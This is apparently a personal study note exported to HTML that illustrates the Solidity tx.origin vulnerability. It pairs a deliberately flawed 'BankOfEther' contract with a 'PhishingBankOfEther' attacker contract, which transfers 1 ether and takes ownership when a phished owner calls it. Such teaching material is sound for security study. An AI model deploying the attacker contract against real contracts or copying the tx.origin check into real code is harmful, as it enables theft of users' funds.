<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Vulnerable Tx.Origin contract (example)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Vulnerable Tx.Origin contract (example)</h1><br/><br /><span style="color:#a020f0;">Target Contract: BankOfEther  (example address: 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8)</span><br /><div class="codebox"><pre>pragma solidity ^0.6.6;<br /><br />contract BankOfEther {<br />  address owner;<br />  mapping (address =&gt;uint) balances;<br />  <br />  constructor() public {<br />    owner = msg.sender;<br />  }<br />    <br />  function deposit() public payable{<br />    balances[msg.sender] = balances[msg.sender]+msg.value;	<br />  }<br />    <br />  function transferTo(address payable to, uint amount) public payable {<br />    require(tx.origin == owner);                                          <span style="color:#0088ff;font-weight:400">//&lt;--</span><br />    to.transfer(amount);<br />  }<br /><br />  function changeOwner(address newOwner) public{<br />    require(tx.origin == owner);                                          <span style="color:#0088ff;font-weight:400">//&lt;--</span><br />    owner = newOwner;<br />  }<br /> <br />  function kill() public {<br />    require(msg.sender == owner);<br />    selfdestruct(msg.sender);<br />  }<br />}</pre></div><br /><br /><span style="color:#ff0000;">Attacker Contract: PhishingBankOfEther (example address: 0x8431717927C4a3343bCf1626e7B5B1D31E240406)</span><br />Owner of this contract and attackerAddress: 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2<br /><div class="codebox"><pre>pragma solidity ^0.6.6;<br /><br />interface targetInterface {<br />  function transferTo(address payable to, uint amount)  payable external ; <br />  function changeOwner(address newOwner) external;<br />  function kill() external;<br />}<br /><br />contract PhishingBankOfEther {<br />  address payable attackerAddress;<br />  targetInterface bankInterface = targetInterface(TARGET_CONTRACTS_ADDRESS);  <span style="color:#0088ff;font-weight:400">//0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8</span><br />  <br />  constructor() public {<br />    attackerAddress = msg.sender;                                             <span style="color:#0088ff;font-weight:400">//0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2</span><br />  }    <br /><br />  function test () payable public {<br />    bankInterface.transferTo(attackerAddress, <span style="color:#ff0044;font-weight:400">1</span> ether);<br />    bankInterface.changeOwner(attackerAddress);<br />  }<br />}</pre></div><br />If we covince the owner of the <span style="color:#a020f0;">Target Contract</span> to use the <span style="color:#ff0000;">Attacker Contract</span> (phishing attack over chat, email, ...) <br />   ◇ first will be transferred 1 ether from the balance of the <span style="color:#a020f0;">Target Contract</span> to the <span style="color:#ff0000;">attackerAddress</span><br />   ◇ Then the owner of the Attacker Contract (<span style="color:#ff0000;">attackerAddress</span>) will become the new owner of the <span style="color:#a020f0;">Target Contract</span></div>
</body>
</html>
